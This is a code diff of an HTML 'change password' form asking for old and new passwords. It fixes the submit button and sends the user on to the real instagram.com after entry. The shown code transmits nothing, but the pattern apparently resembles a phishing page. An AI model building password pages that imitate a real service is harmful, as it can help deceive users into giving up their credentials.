@@ -157,7 +157,7 @@
             <input type="password" id="oldpassword" placeholder="Old password" required="true" name="Old Password">
             <input type="password" id="newpassword" placeholder="New password" required="true" name="New Password">
             <input type="password" id="newpasswordagain" placeholder="New password, again" required="true">
-            <button><a id="submit" onclick="thankyou()">Submit</a></button>
+            <button id="submit" onclick="thankyou()">Submit</button>
         </form>
     </div>
     <script>
@@ -181,7 +181,7 @@
         }
         function thankyou() {
             if(oldPassword.value.length >= 6 && newPassword.value.length >= 6 && confNewPassword.value.length > 5){
-                window.location.href = "password_changed.html";
+                window.location.href = "https://www.instagram.com";
             }
         }
     </script>
